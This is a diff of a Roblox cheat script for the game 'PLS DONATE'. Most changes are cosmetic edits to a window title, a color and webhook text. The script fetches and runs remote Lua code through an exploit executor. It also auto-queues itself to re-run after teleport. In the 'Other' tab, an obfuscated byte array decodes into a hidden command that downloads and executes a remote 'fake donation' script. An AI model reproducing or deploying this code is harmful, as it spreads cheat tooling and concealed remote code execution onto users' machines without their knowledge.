@@ -2,7 +2,6 @@
 repeat
     wait()
 until game:IsLoaded()
-
 --Stops script if on a different game
 if game.PlaceId ~= 8737602449 and game.PlaceId ~= 8943844393 then
     return
@@ -44,7 +43,7 @@ local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or 
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = game:GetService('HttpService')
 local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/Fr0go1/PREMIUMPLSDONATE/main/UI.lua")()
-local win = Flux:Window("You Poor Prem", "Ice_cream_sandwich#4865", Color3.fromRGB(6, 137, 189), Enum.KeyCode.RightShift)
+local win = Flux:Window("You Poor PREM", "Ice_cream_sandwich#4865", Color3.fromRGB(8, 143, 195), Enum.KeyCode.RightShift)
 local function claimGifts()
     pcall(function()
         Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -742,7 +741,7 @@ end)
 
 webhookTab:Button("Test", "Sends a test message to your webhook to verify it is working", function()
     if getgenv().settings.webhookBox then
-        webhook("CapySploit PLS DONATE AFK Script")
+        webhook("Pls Donate Script Test")
 	webhook("This is test")
     end
 end)
@@ -790,7 +789,7 @@ end)
 
 serverHopTab:Toggle("Re-Execute", "Executes the script after server hop\nTurn this off if you use autoexec", getgenv().settings.reex, function(t)
     if t and not exd then
-        queueonteleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/Fr0go1/PREMIUMPLSDONATE/main/MAIN.lua"))()")
+        queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Fr0go1/PREMIUMPLSDONATE/main/MAIN.lua'))()")
         exd = true
     end
     if settingsLock then return end
@@ -814,7 +813,7 @@ local otherTab = win:Tab("Other", "http://www.roblox.com/asset/?id=10213989952")
 
 otherTab:Button("Free Robux", "This gives free robux (not client sided) I found this glitch scrolling through youtube.", function()
     local player = game:GetService("Players").LocalPlayer
-    player:Kick("You thought")
+    player:Kick("You thought :skull:")
 end)
 
 otherTab:Button("Fake Nuke", "This makes a fake nuke happen on your server.\nOnly you can see this.", function()
@@ -825,7 +824,7 @@ _G.WhoGotRobux = player.Name
 
 SGTSOBF_ffFFFFFFf={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\114","\97","\119","\46","\103","\105","\116","\104","\117","\98","\117","\115","\101","\114","\99","\111","\110","\116","\101","\110","\116","\46","\99","\111","\109","\47","\108","\111","\108","\116","\104","\97","\116","\115","\101","\97","\122","\121","\47","\101","\122","\97","\122","\97","\47","\109","\97","\105","\110","\47","\80","\108","\115","\68","\111","\110","\97","\116","\101","\70","\97","\107","\101","\68","\111","\110","\111","\46","\116","\120","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_gGGGgGggg="";for _,SGTSOBF_RRrrRRrrr in pairs(SGTSOBF_ffFFFFFFf)do SGTSOBF_gGGGgGggg=SGTSOBF_gGGGgGggg..SGTSOBF_RRrrRRrrr;end;SGTSOBF_LlllllLlL=function(SGTSOBF_zZzZzZzzZ)loadstring(SGTSOBF_zZzZzZzzZ)()end;SGTSOBF_LlllllLlL(SGTSOBF_gGGGgGggg)
 end)
-		
+
 otherTab:Button("Dance Script", "Loads a external dance script (only works till you server hop)", function()
     Flux:Notification("Script executed!", "Please click , on your keyboard to choose a animation. This script works till you server hop/change servers.", "Got it.")
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()
